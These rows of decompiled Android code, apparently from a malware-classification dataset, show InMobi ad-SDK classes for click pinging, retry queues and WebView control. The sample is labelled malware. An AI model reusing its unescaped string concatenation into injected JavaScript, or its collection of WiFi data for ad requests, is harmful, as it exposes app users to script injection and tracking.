"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk.impl.imai\b.code","public static class b implements Runnable {   final String a;   final boolean b;   final WeakReference c;   b(  String str,  boolean z,  WeakReference weakReference){     this.a=str;     this.b=z;     this.c=weakReference;   }   @Override public void run(){     try {       ClickData clickData=new ClickData(this.a,this.b,true,Initializer.getConfigParams().getImai().getMaxRetry());       RequestResponseManager requestResponseManager=new RequestResponseManager();       requestResponseManager.init();       RequestResponseManager.mNetworkQueue.add(0,clickData);       requestResponseManager.processClick(InternalSDKUtil.getContext(),new a());     }  catch (    Exception e) {       Log.internal(ConfigConstants.LOGGING_TAG,""Exception ping in background"",e);     }   } class a implements HttpRequestCallback {     a(){     }     @Override public void notifyResult(    int i,    Object obj){       try {         Log.internal(ConfigConstants.LOGGING_TAG,""Got PING IN WEBVIEW callback. Status: "" + i);         if (i == 0) {           IMAICore.firePingInWebViewSuccessful(b.this.c,b.this.a);         }  else {           IMAICore.fireErrorEvent(b.this.c,""IMAI Ping in webview failed"",""pingInWebview"",b.this.a);         }       }  catch (      Exception e) {         Log.internal(ConfigConstants.LOGGING_TAG,""Exception"",e);       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk.impl.imai\c.code","public static class c implements Runnable {   final IMWebView a;   final String b;   c(  IMWebView iMWebView,  String str){     this.a=iMWebView;     this.b=str;   }   @Override public void run(){     this.a.injectJavaScript(this.b);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk.impl.imai\C0020a.code","class C0020a implements HttpRequestCallback {   C0020a(){   }   @Override public void notifyResult(  int i,  Object obj){     try {       Log.internal(ConfigConstants.LOGGING_TAG,""Got PING callback. Status: "" + i);       if (i == 0) {         IMAICore.firePingSuccessful(a.this.c,a.this.a);       }  else {         IMAICore.fireErrorEvent(a.this.c,""IMAI Ping in http client failed"",""ping"",a.this.a);       }     }  catch (    Exception e) {       Log.internal(ConfigConstants.LOGGING_TAG,""Exception"",e);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk.impl.imai\IMAIClickEventList.code","public class IMAIClickEventList extends ArrayList<ClickData> {   private static final long serialVersionUID=-211778664111073467L;   public static synchronized IMAIClickEventList getLoggedClickEvents(){     IMAIClickEventList iMAIClickEventList; synchronized (IMAIClickEventList.class) {       iMAIClickEventList=null;       if (ClickDatabaseManager.getInstance().getNoOfEvents() != 0) {         int i=Initializer.getConfigParams().getImai().getmDefaultEventsBatch();         ClickDatabaseManager.getInstance().setDBLimit(Initializer.getConfigParams().getImai().getmMaxDb());         IMAIClickEventList clickEvents=ClickDatabaseManager.getInstance().getClickEvents(i);         ArrayList<Long> arrayList=new ArrayList<>();         Iterator<ClickData> it=clickEvents.iterator();         while (it.hasNext()) {           arrayList.add(Long.valueOf(it.next().getClickId()));         }         ClickDatabaseManager.getInstance().deleteClickEvents(arrayList);         iMAIClickEventList=clickEvents;       }       if (iMAIClickEventList == null) {         iMAIClickEventList=new IMAIClickEventList();       }     }     return iMAIClickEventList;   }   public void saveClickEvents(){     Log.internal(ConfigConstants.LOGGING_TAG,""Save ping events"");     if (RequestResponseManager.mDBWriterQueue != null && !RequestResponseManager.mDBWriterQueue.isEmpty()) {       Iterator<ClickData> it=RequestResponseManager.mDBWriterQueue.iterator();       while (it.hasNext()) {         ClickDatabaseManager.getInstance().insertClick(it.next());       }     }   }   public ClickData getClickEvent(  long j){     try {       Iterator<ClickData> it=iterator();       while (it.hasNext()) {         ClickData next=it.next();         if (next.getClickId() == j) {           return next;         }       }       return null;     }  catch (    Exception e) {       Log.internal(ConfigConstants.LOGGING_TAG,""Cant get click event"",e);       return null;     }   }   public synchronized boolean removeClickEvent(  long j){     boolean z=false; synchronized (this) {       try {         RequestResponseManager.isSynced.set(false);         remove(getClickEvent(j));         z=true;       }  catch (      Exception e) {         Log.internal(ConfigConstants.LOGGING_TAG,""Cant remove click event"",e);       }     }     return z;   }   public synchronized void reduceRetryCount(  int i){     try {       RequestResponseManager.isSynced.set(false);       ClickData clickEvent=getClickEvent(i);       int retryCount=clickEvent.getRetryCount();       removeClickEvent(i);       if (retryCount > 1) {         clickEvent.setRetryCount(clickEvent.getRetryCount() - 1);         add(clickEvent);       }     }  catch (    Exception e) {       Log.internal(ConfigConstants.LOGGING_TAG,""Cant reduce retry count"",e);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk.impl.imai\IMAIController.code","public class IMAIController {   public static final String IMAI_BRIDGE=""imaiController"";   private transient WeakReference<IMWebView> a;   public IMAIController(  IMWebView iMWebView){     IMAICore.initialize();     this.a=new WeakReference<>(iMWebView);   }   @JavascriptInterface public String getPlatformVersion(){     Log.debug(ConfigConstants.LOGGING_TAG,""get platform version"");     return Integer.toString(Build.VERSION.SDK_INT);   }   @JavascriptInterface public String getSdkVersion(){     Log.debug(ConfigConstants.LOGGING_TAG,""get sdk version"");     return InMobi.getVersion();   }   @JavascriptInterface public void log(  String str){     Log.debug(ConfigConstants.LOGGING_TAG,str);   }   @JavascriptInterface public void openEmbedded(  String str){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(1001),null));     try {       Log.debug(ConfigConstants.LOGGING_TAG,""IMAI open Embedded"");       if (!IMAICore.validateURL(str)) {         IMAICore.fireErrorEvent(this.a,""Null url passed"",""openEmbedded"",str);       }  else       if (str.startsWith(""http"") || str.startsWith(""https"")) {         IMAICore.launchEmbeddedBrowser(this.a,str);         IMAICore.fireOpenEmbeddedSuccessful(this.a,str);       }  else {         openExternal(str);       }     }  catch (    Exception e) {       IMAICore.fireErrorEvent(this.a,e.getMessage(),""openEmbedded"",str);       Log.internal(ConfigConstants.LOGGING_TAG,""IMAI openEmbedded failed"",e);     }   }   @JavascriptInterface public void openExternal(  String str){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(ApiStatCollector.ApiEventType.API_IMAI_OPEN_EXTERNAL),null));     try {       Log.debug(ConfigConstants.LOGGING_TAG,""IMAI open external"");       if (!IMAICore.validateURL(str)) {         IMAICore.fireErrorEvent(this.a,""Null url passed"",""openExternal"",str);       }  else {         IMAICore.launchExternalApp(str);         IMAICore.fireOpenExternalSuccessful(this.a,str);       }     }  catch (    Exception e) {       IMAICore.fireErrorEvent(this.a,e.getMessage(),""openExternal"",str);       Log.internal(ConfigConstants.LOGGING_TAG,""IMAI openExternal failed"",e);     }   }   @JavascriptInterface public void ping(  String str,  boolean z){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(ApiStatCollector.ApiEventType.API_IMAI_PING),null));     try {       Log.debug(ConfigConstants.LOGGING_TAG,""IMAI ping"");       if (!IMAICore.validateURL(str)) {         IMAICore.fireErrorEvent(this.a,""Null url passed"",""ping"",str);       }  else       if (str.contains(""http"") || str.contains(""https"")) {         IMAICore.ping(this.a,str,z);       }  else {         IMAICore.fireErrorEvent(this.a,""Invalid url passed"",""ping"",str);       }     }  catch (    Exception e) {       IMAICore.fireErrorEvent(this.a,e.getMessage(),""ping"",str);       Log.internal(ConfigConstants.LOGGING_TAG,""IMAI ping failed"",e);     }   }   @JavascriptInterface public void pingInWebView(  String str,  boolean z){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(ApiStatCollector.ApiEventType.API_IMAI_PING_IN_WEB_VIEW),null));     try {       Log.debug(ConfigConstants.LOGGING_TAG,""IMAI ping in webview"");       if (!IMAICore.validateURL(str)) {         IMAICore.fireErrorEvent(this.a,""Null url passed"",""pingInWebView"",str);       }  else       if (str.contains(""http"") || str.contains(""https"")) {         IMAICore.pingInWebview(this.a,str,z);       }  else {         IMAICore.fireErrorEvent(this.a,""Invalid url passed"",""pingInWebView"",str);       }     }  catch (    Exception e) {       IMAICore.fireErrorEvent(this.a,e.getMessage(),""pingInWebView"",str);       Log.internal(ConfigConstants.LOGGING_TAG,""IMAI pingInWebView failed"",e);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk.impl.imai\IMAICore.code","public class IMAICore {   static Random a=new Random();   public static void initialize(){     new RequestResponseManager().init();     ClickDatabaseManager.getInstance().setDBLimit(Initializer.getConfigParams().getImai().getmMaxDb());   }   public static void fireErrorEvent(  WeakReference<IMWebView> weakReference,  String str,  String str2,  String str3){     if (weakReference != null) {       try {         if (weakReference.get() != null) {           Log.debug(ConfigConstants.LOGGING_TAG,""Fire error event IMAI for action: "" + str2 + "" ""+ str);           injectJavaScript(weakReference.get(),""window._im_imai.broadcastEvent('error','"" + str + ""','""+ str2+ ""','""+ str3+ ""')"");         }       }  catch (      Exception e) {         Log.internal(ConfigConstants.LOGGING_TAG,""Exception"",e);       }     }   }   public static void fireOpenEmbeddedSuccessful(  WeakReference<IMWebView> weakReference,  String str){     if (weakReference != null) {       try {         if (weakReference.get() != null) {           Log.debug(ConfigConstants.LOGGING_TAG,""fireOpenEmbeddedSuccessful"");           if (!weakReference.get().mWebViewIsBrowserActivity && !weakReference.get().mIsInterstitialAd) {             IMBrowserActivity.requestOnAdDismiss(weakReference.get().getWebviewHandler().obtainMessage(weakReference.get().getDismissMessage()));             weakReference.get().fireOnShowAdScreen();           }           injectJavaScript(weakReference.get(),""window._im_imai.broadcastEvent('openEmbeddedSuccessful','"" + str + ""')"");         }       }  catch (      Exception e) {         Log.internal(ConfigConstants.LOGGING_TAG,""Exception"",e);       }     }   }   public static void fireOpenExternalSuccessful(  WeakReference<IMWebView> weakReference,  String str){     if (weakReference != null) {       try {         if (weakReference.get() != null) {           Log.debug(ConfigConstants.LOGGING_TAG,""fireOpenExternalSuccessful"");           weakReference.get().fireOnLeaveApplication();           injectJavaScript(weakReference.get(),""window._im_imai.broadcastEvent('openExternalSuccessful','"" + str + ""')"");         }       }  catch (      Exception e) {         Log.internal(ConfigConstants.LOGGING_TAG,""Exception"",e);       }     }   }   public static void firePingSuccessful(  WeakReference<IMWebView> weakReference,  String str){     if (weakReference != null) {       try {         if (weakReference.get() != null) {           Log.debug(ConfigConstants.LOGGING_TAG,""firePingSuccessful"");           injectJavaScript(weakReference.get(),""window._im_imai.broadcastEvent('pingSuccessful','"" + str + ""')"");         }       }  catch (      Exception e) {         Log.internal(ConfigConstants.LOGGING_TAG,""Exception"",e);       }     }   }   public static void firePingInWebViewSuccessful(  WeakReference<IMWebView> weakReference,  String str){     if (weakReference != null) {       try {         if (weakReference.get() != null) {           Log.debug(ConfigConstants.LOGGING_TAG,""firePingInWebViewSuccessful"");           injectJavaScript(weakReference.get(),""window._im_imai.broadcastEvent('pingInWebViewSuccessful','"" + str + ""')"");         }       }  catch (      Exception e) {         Log.internal(ConfigConstants.LOGGING_TAG,""Exception"",e);       }     }   } public static class c implements Runnable {     final IMWebView a;     final String b;     c(    IMWebView iMWebView,    String str){       this.a=iMWebView;       this.b=str;     }     @Override public void run(){       this.a.injectJavaScript(this.b);     }   }   public static void injectJavaScript(  IMWebView iMWebView,  String str){     try {       iMWebView.getActivity().runOnUiThread(new c(iMWebView,str));     }  catch (    Exception e) {       Log.internal(ConfigConstants.LOGGING_TAG,""Error injecting javascript "",e);     }   }   public static void launchEmbeddedBrowser(  WeakReference<IMWebView> weakReference,  String str){     Intent intent=new Intent(weakReference.get().getActivity(),(Class<?>)IMBrowserActivity.class);     intent.putExtra(IMBrowserActivity.EXTRA_URL,str);     intent.setFlags(268435456);     IMBrowserActivity.setWebViewListener(weakReference.get().mListener);     if (!weakReference.get().mWebViewIsBrowserActivity && !weakReference.get().mIsInterstitialAd && weakReference.get().getStateVariable() == IMWebView.ViewState.DEFAULT) {       intent.putExtra(""FIRST_INSTANCE"",true);       intent.putExtra(""QAMODE"",SDKUtil.getQAMode());     }     weakReference.get().getActivity().getApplicationContext().startActivity(intent);   }   public static void launchExternalApp(  String str){     Intent intent=new Intent(""android.intent.action.VIEW"");     intent.setData(Uri.parse(str));     intent.setFlags(268435456);     InternalSDKUtil.getContext().startActivity(intent);   } public static class a implements Runnable {     final String a;     final boolean b;     final WeakReference c;     a(    String str,    boolean z,    WeakReference weakReference){       this.a=str;       this.b=z;       this.c=weakReference;     }     @Override public void run(){       try {         ClickData clickData=new ClickData(this.a,this.b,false,Initializer.getConfigParams().getImai().getMaxRetry());         RequestResponseManager requestResponseManager=new RequestResponseManager();         requestResponseManager.init();         RequestResponseManager.mNetworkQueue.add(0,clickData);         requestResponseManager.processClick(InternalSDKUtil.getContext(),new C0020a());       }  catch (      Exception e) {         Log.internal(ConfigConstants.LOGGING_TAG,""Exception ping in background"",e);       }     } class C0020a implements HttpRequestCallback {       C0020a(){       }       @Override public void notifyResult(      int i,      Object obj){         try {           Log.internal(ConfigConstants.LOGGING_TAG,""Got PING callback. Status: "" + i);           if (i == 0) {             IMAICore.firePingSuccessful(a.this.c,a.this.a);           }  else {             IMAICore.fireErrorEvent(a.this.c,""IMAI Ping in http client failed"",""ping"",a.this.a);           }         }  catch (        Exception e) {           Log.internal(ConfigConstants.LOGGING_TAG,""Exception"",e);         }       }     }   }   public static void ping(  WeakReference<IMWebView> weakReference,  String str,  boolean z){     try {       weakReference.get().getActivity().runOnUiThread(new a(str,z,weakReference));     }  catch (    Exception e) {       Log.internal(ConfigConstants.LOGGING_TAG,""Failed to ping"",e);     }   } public static class b implements Runnable {     final String a;     final boolean b;     final WeakReference c;     b(    String str,    boolean z,    WeakReference weakReference){       this.a=str;       this.b=z;       this.c=weakReference;     }     @Override public void run(){       try {         ClickData clickData=new ClickData(this.a,this.b,true,Initializer.getConfigParams().getImai().getMaxRetry());         RequestResponseManager requestResponseManager=new RequestResponseManager();         requestResponseManager.init();         RequestResponseManager.mNetworkQueue.add(0,clickData);         requestResponseManager.processClick(InternalSDKUtil.getContext(),new a());       }  catch (      Exception e) {         Log.internal(ConfigConstants.LOGGING_TAG,""Exception ping in background"",e);       }     } class a implements HttpRequestCallback {       a(){       }       @Override public void notifyResult(      int i,      Object obj){         try {           Log.internal(ConfigConstants.LOGGING_TAG,""Got PING IN WEBVIEW callback. Status: "" + i);           if (i == 0) {             IMAICore.firePingInWebViewSuccessful(b.this.c,b.this.a);           }  else {             IMAICore.fireErrorEvent(b.this.c,""IMAI Ping in webview failed"",""pingInWebview"",b.this.a);           }         }  catch (        Exception e) {           Log.internal(ConfigConstants.LOGGING_TAG,""Exception"",e);         }       }     }   }   public static void pingInWebview(  WeakReference<IMWebView> weakReference,  String str,  boolean z){     try {       weakReference.get().getActivity().runOnUiThread(new b(str,z,weakReference));     }  catch (    Exception e) {       Log.internal(ConfigConstants.LOGGING_TAG,""Failed to ping in webview"",e);     }   }   public static boolean validateURL(  String str){     if (str != null && !"""".equals(str.trim())) {       return true;     }     Log.internal(ConfigConstants.LOGGING_TAG,""Null url passed"");     return false;   }   public static int getRandomNumber(){     return a.nextInt();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk.impl.imai.db\ClickData.code","public class ClickData {   private long a;   private String b;   private boolean c;   private int d;   private boolean e;   private long f;   public ClickData(){   }   public ClickData(  String str,  boolean z,  boolean z2,  int i){     setClickId(IMAICore.getRandomNumber());     setClickUrl(str);     setFollowRedirect(z);     setPingWv(z2);     setRetryCount(i);     setTimestamp(System.currentTimeMillis());   }   public long getClickId(){     return this.a;   }   public void setClickId(  long j){     this.a=j;   }   public String getClickUrl(){     return this.b;   }   public void setClickUrl(  String str){     this.b=str;   }   public long getTimestamp(){     return this.f;   }   public void setTimestamp(  long j){     this.f=j;   }   public boolean isPingWv(){     return this.c;   }   public void setPingWv(  boolean z){     this.c=z;   }   public int getRetryCount(){     return this.d;   }   public void setRetryCount(  int i){     this.d=i;   }   public boolean isFollowRedirects(){     return this.e;   }   public void setFollowRedirect(  boolean z){     this.e=z;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk.impl.imai.db\ClickDatabaseManager.code","public class ClickDatabaseManager extends DatabaseHandler {   public static final String COLUMN_CLICK_ID=""clickid"";   public static final String COLUMN_CLICK_URL=""clickurl"";   public static final String COLUMN_FOLLOW_REDIRECT=""followredirect"";   public static final String COLUMN_PINGWV=""pingwv"";   public static final String COLUMN_RETRY_COUNT=""retrycount"";   public static final String COLUMN_TIMESTAMP=""timestamp"";   public static final String TABLE_CLICK=""clickevent"";   private static ClickDatabaseManager a;   private int b;   protected ClickDatabaseManager(  Context context,  ArrayList<TableData> arrayList){     super(context,arrayList);     this.b=1000;   }   public static synchronized ClickDatabaseManager getInstance(){     ClickDatabaseManager clickDatabaseManager; synchronized (ClickDatabaseManager.class) {       try {         if (a == null) {           ArrayList arrayList=new ArrayList();           arrayList.add(a());           a=new ClickDatabaseManager(InternalSDKUtil.getContext(),arrayList);         }         clickDatabaseManager=a;       }  catch (      Exception e) {         Log.internal(ConfigConstants.LOGGING_TAG,""Exception getting DB Manager Instance"",e);         clickDatabaseManager=null;       }     }     return clickDatabaseManager;   }   private static TableData a(){     TableData tableData=new TableData();     LinkedHashMap<String,ColumnData> linkedHashMap=new LinkedHashMap<>();     ColumnData columnData=new ColumnData();     columnData.setPrimaryKey(true);     columnData.setDataType(ColumnData.ColumnType.INTEGER);     columnData.setMandatory(true);     linkedHashMap.put(COLUMN_CLICK_ID,columnData);     ColumnData columnData2=new ColumnData();     columnData2.setDataType(ColumnData.ColumnType.VARCHAR);     columnData2.setMandatory(true);     linkedHashMap.put(COLUMN_CLICK_URL,columnData2);     ColumnData columnData3=new ColumnData();     columnData3.setDataType(ColumnData.ColumnType.INTEGER);     columnData3.setMandatory(true);     linkedHashMap.put(COLUMN_PINGWV,columnData3);     ColumnData columnData4=new ColumnData();     columnData4.setDataType(ColumnData.ColumnType.INTEGER);     columnData4.setMandatory(true);     linkedHashMap.put(COLUMN_FOLLOW_REDIRECT,columnData4);     ColumnData columnData5=new ColumnData();     columnData5.setDataType(ColumnData.ColumnType.INTEGER);     columnData5.setMandatory(true);     linkedHashMap.put(COLUMN_RETRY_COUNT,columnData5);     ColumnData columnData6=new ColumnData();     columnData6.setDataType(ColumnData.ColumnType.INTEGER);     columnData6.setMandatory(true);     linkedHashMap.put(""timestamp"",columnData6);     tableData.setmColumns(linkedHashMap);     tableData.setmTableName(TABLE_CLICK);     return tableData;   }   public synchronized void insertClick(  ClickData clickData){     try {       open();       ContentValues contentValues=new ContentValues();       contentValues.put(""timestamp"",Long.valueOf(clickData.getTimestamp()));       contentValues.put(COLUMN_CLICK_URL,clickData.getClickUrl());       contentValues.put(COLUMN_PINGWV,Boolean.valueOf(clickData.isPingWv()));       contentValues.put(COLUMN_RETRY_COUNT,Integer.valueOf(clickData.getRetryCount()));       contentValues.put(COLUMN_FOLLOW_REDIRECT,Boolean.valueOf(clickData.isFollowRedirects()));       if (getTableSize(TABLE_CLICK) >= this.b) {         Cursor executeQuery=executeQuery(""SELECT clickid FROM clickevent WHERE timestamp= (SELECT MIN(timestamp) FROM clickevent Limit 1);"",null);         executeQuery.moveToFirst();         long j=executeQuery.getLong(0);         executeQuery.close();         delete(TABLE_CLICK,""clickid = "" + j,null);       }       insert(TABLE_CLICK,contentValues);       close();     }  catch (    Exception e) {       e.printStackTrace();       Log.internal(InternalSDKUtil.LOGGING_TAG,""Failed to insert click event to db"",e);     }   }   public synchronized IMAIClickEventList getClickEvents(  int i){     IMAIClickEventList iMAIClickEventList;     iMAIClickEventList=new IMAIClickEventList();     try {       open();       Cursor nRows=getNRows(TABLE_CLICK,""timestamp"",i);       nRows.moveToFirst();       do {         ClickData clickData=new ClickData();         clickData.setClickId(nRows.getLong(0));         clickData.setClickUrl(nRows.getString(1));         if (1 == nRows.getInt(2)) {           clickData.setPingWv(true);         }  else {           clickData.setPingWv(false);         }         if (1 == nRows.getInt(3)) {           clickData.setFollowRedirect(true);         }  else {           clickData.setFollowRedirect(false);         }         clickData.setRetryCount(nRows.getInt(4));         clickData.setTimestamp(nRows.getLong(5));         iMAIClickEventList.add(clickData);       }  while (nRows.moveToNext());       nRows.close();       close();     }  catch (    Exception e) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""Failed to get clicks from db"",e);     }     return iMAIClickEventList;   }   public synchronized boolean deleteClickEvents(  ArrayList<Long> arrayList){     boolean z;     if (arrayList != null) {       try {       }  catch (      Exception e) {         Log.internal(ConfigConstants.LOGGING_TAG,""Exception deleting click events"",e);         z=false;       }       if (!arrayList.isEmpty()) {         open();         Iterator<Long> it=arrayList.iterator();         while (it.hasNext()) {           delete(TABLE_CLICK,""clickid = "" + it.next().longValue(),null);         }         close();         z=true;       }     }     z=false;     return z;   }   public synchronized boolean updateRetryCount(  ArrayList<ClickData> arrayList){     boolean z;     if (arrayList != null) {       try {       }  catch (      Exception e) {         Log.internal(ConfigConstants.LOGGING_TAG,""Exception updating retry count"",e);         z=false;       }       if (!arrayList.isEmpty()) {         open();         Iterator<ClickData> it=arrayList.iterator();         while (it.hasNext()) {           ClickData next=it.next();           ContentValues contentValues=new ContentValues();           contentValues.put(COLUMN_CLICK_ID,Long.valueOf(next.getClickId()));           contentValues.put(COLUMN_CLICK_URL,next.getClickUrl());           contentValues.put(COLUMN_FOLLOW_REDIRECT,Boolean.valueOf(next.isFollowRedirects()));           contentValues.put(COLUMN_PINGWV,Boolean.valueOf(next.isPingWv()));           contentValues.put(COLUMN_RETRY_COUNT,Integer.valueOf(next.getRetryCount() + 1));           contentValues.put(""timestamp"",Long.valueOf(next.getTimestamp()));           update(TABLE_CLICK,contentValues,""clickid= ?"",new String[]{String.valueOf(next.getClickId())});         }         close();         z=true;       }     }     z=false;     return z;   }   public void setDBLimit(  int i){     if (i > 0) {       this.b=i;     }   }   public int getNoOfEvents(){     try {       open();       int noOfRows=getInstance().getNoOfRows(TABLE_CLICK,null,null);       close();       return noOfRows;     }  catch (    Exception e) {       Log.internal(ConfigConstants.LOGGING_TAG,""Exception getting no of click events"",e);       return 0;     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk.impl.net\a.code","class a extends Thread {   final UserInfo a;   final String b;   final ActionType c;   final HttpRequestCallback d;   a(  UserInfo userInfo,  String str,  ActionType actionType,  HttpRequestCallback httpRequestCallback){     this.a=userInfo;     this.b=str;     this.c=actionType;     this.d=httpRequestCallback;   }   @Override public void run(){     WifiInfo wifiInfo=null;     try {       try {         wifiInfo=IceDataCollector.getConnectedWifiInfo(this.a.getApplicationContext());       }  catch (      Exception e) {         try {           Log.internal(ConfigConstants.LOGGING_TAG,""No wifi permissions set, unable to send wifi data"");         }  catch (        Exception e2) {           Log.debug(ConfigConstants.LOGGING_TAG,""Exception retrieving ad "",e2);           RequestResponseManager.this.a(1,AdRequest.ErrorCode.INTERNAL_ERROR,this.d);           return;         }       }       Log.debug(ConfigConstants.LOGGING_TAG,""Ad Serving URL: "" + this.b);       String buildPostBody=HttpRequestBuilder.buildPostBody(this.a,wifiInfo,this.c);       Log.debug(ConfigConstants.LOGGING_TAG,buildPostBody);       RequestResponseManager.this.e=RequestResponseManager.this.a(this.b,this.a);       RequestResponseManager.this.a(buildPostBody);       RequestResponseManager.this.a(0,RequestResponseManager.this.a(this.a),this.d);     }  catch (    AdException e3) {       Log.debug(ConfigConstants.LOGGING_TAG,""Exception retrieving ad "",e3);       RequestResponseManager.this.a(1,e3,this.d);     } catch (    IOException e4) {       Log.debug(ConfigConstants.LOGGING_TAG,""Exception retrieving ad "",e4);       if (!(e4 instanceof SocketTimeoutException)) {         RequestResponseManager.this.a(1,AdRequest.ErrorCode.NETWORK_ERROR,this.d);       }  else {         Log.internal(ConfigConstants.LOGGING_TAG,""Server Timeout"");         RequestResponseManager.this.a(1,AdRequest.ErrorCode.AD_FETCH_TIMEOUT,this.d);       }     }   } } class a implements Runnable {   a(){   }   @Override public void run(){     try {       if (WebviewLoader.this.c != null) {         WebviewLoader.b.set(false);       }       WebviewLoader.this.c.stopLoading();     }  catch (    Exception e) {       Log.internal(ConfigConstants.LOGGING_TAG,""Exception stop loading"",e);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk.impl.net\b.code","class b implements Runnable {   final Context a;   final HttpRequestCallback b;   b(  Context context,  HttpRequestCallback httpRequestCallback){     this.a=context;     this.b=httpRequestCallback;   }   @Override public void run(){     while (!RequestResponseManager.isSynced.get()) {       try {         RequestResponseManager.isSynced.set(true);         if (RequestResponseManager.mNetworkQueue == null || RequestResponseManager.mNetworkQueue.isEmpty()) {           if (RequestResponseManager.mDBWriterQueue == null && RequestResponseManager.mDBWriterQueue.isEmpty()) {             Log.internal(ConfigConstants.LOGGING_TAG,""Click event list empty"");             RequestResponseManager.this.deinit();             return;           }  else {             RequestResponseManager.mNetworkQueue.addAll(RequestResponseManager.mDBWriterQueue);             RequestResponseManager.mDBWriterQueue.clear();           }         }         while (!RequestResponseManager.mNetworkQueue.isEmpty()) {           try {             ClickData remove=RequestResponseManager.mNetworkQueue.remove(0);             String clickUrl=remove.getClickUrl();             int retryCount=remove.getRetryCount();             boolean isPingWv=remove.isPingWv();             boolean isFollowRedirects=remove.isFollowRedirects();             int retryInterval=Initializer.getConfigParams().getImai().getRetryInterval();             if (!InternalSDKUtil.checkNetworkAvailibility(this.a)) {               Log.internal(ConfigConstants.LOGGING_TAG,""Cannot process click. Network Not available"");               if (retryCount > 1) {                 RequestResponseManager.mDBWriterQueue.add(remove);               }               if (this.b != null) {                 this.b.notifyResult(1,null);               }               RequestResponseManager.this.deinit();               return;             }             int maxRetry=Initializer.getConfigParams().getImai().getMaxRetry();             if (!RequestResponseManager.h.get() && retryCount < maxRetry) {               Log.internal(ConfigConstants.LOGGING_TAG,""Retrying to ping in background after "" + (retryInterval / 1000) + "" secs""); synchronized (RequestResponseManager.a) {                 try {                   RequestResponseManager.a.wait(retryInterval);                 }  catch (                InterruptedException e) {                   Log.internal(ConfigConstants.LOGGING_TAG,""Network thread wait failure"",e);                 }               }             }             Log.internal(ConfigConstants.LOGGING_TAG,""Processing click in background: "" + clickUrl);             if (isPingWv) {               if (RequestResponseManager.this.processClickUrlInWebview(clickUrl)) {                 Log.internal(ConfigConstants.LOGGING_TAG,""Ping in webview successful: "" + clickUrl);                 if (this.b != null) {                   this.b.notifyResult(0,null);                 }               }  else {                 remove.setRetryCount(retryCount - 1);                 if (retryCount > 1) {                   RequestResponseManager.mDBWriterQueue.add(remove);                 }                 Log.internal(ConfigConstants.LOGGING_TAG,""Ping in webview failed: "" + clickUrl);                 if (this.b != null) {                   this.b.notifyResult(1,null);                 }               }             }  else             if (RequestResponseManager.this.processClickHttpClient(clickUrl,isFollowRedirects)) {               Log.internal(ConfigConstants.LOGGING_TAG,""Ping successful: "" + clickUrl);               if (this.b != null) {                 this.b.notifyResult(0,null);               }             }  else {               remove.setRetryCount(retryCount - 1);               if (retryCount > 1) {                 RequestResponseManager.mDBWriterQueue.add(remove);               }               Log.internal(ConfigConstants.LOGGING_TAG,""Ping  failed: "" + clickUrl);               if (this.b != null) {                 this.b.notifyResult(1,null);               }               Log.internal(ConfigConstants.LOGGING_TAG,""Ping failed: "" + clickUrl);             }             if (RequestResponseManager.mDBWriterQueue.size() > Initializer.getConfigParams().getImai().getmDefaultEventsBatch()) {               RequestResponseManager.mDBWriterQueue.saveClickEvents();               RequestResponseManager.mDBWriterQueue.clear();             }           }  catch (          Exception e2) {             Log.internal(ConfigConstants.LOGGING_TAG,""Exception pinging click in background"",e2);             RequestResponseManager.this.deinit();             return;           }         }       }  catch (      Exception e3) {         Log.internal(ConfigConstants.LOGGING_TAG,""Exception ping to server "",e3);         return;       }     }     RequestResponseManager.this.deinit();   } } public class b implements Runnable {   final String a;   final HashMap b;   b(  String str,  HashMap hashMap){     this.a=str;     this.b=hashMap;   }   @Override public void run(){     try {       WebviewLoader.b.set(true);       WebviewLoader.this.c.loadUrl(this.a,this.b);     }  catch (    Exception e) {       Log.internal(ConfigConstants.LOGGING_TAG,""Exception load in webview"",e);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk.impl.net\c.code","class c extends Thread {   c(){   }   @Override public void run(){     try {       RequestResponseManager.this.e.disconnect();     }  catch (    Exception e) {       Log.internal(ConfigConstants.LOGGING_TAG,""Exception in closing connection "",e);     }   } } class c implements Runnable {   final Context a;   c(  Context context){     this.a=context;   }   @Override public void run(){     try {       WebviewLoader.this.c=new WebView(this.a);       WebviewLoader.b=new AtomicBoolean(false);       WebviewLoader.this.c.setWebViewClient(new MyWebViewClient());       WebviewLoader.this.c.getSettings().setJavaScriptEnabled(true);       WebviewLoader.this.c.getSettings().setPluginState(WebSettings.PluginState.ON);       WebviewLoader.this.c.getSettings().setCacheMode(2);     }  catch (    Exception e) {       Log.internal(ConfigConstants.LOGGING_TAG,""Exception init webview"",e);     }   } } "
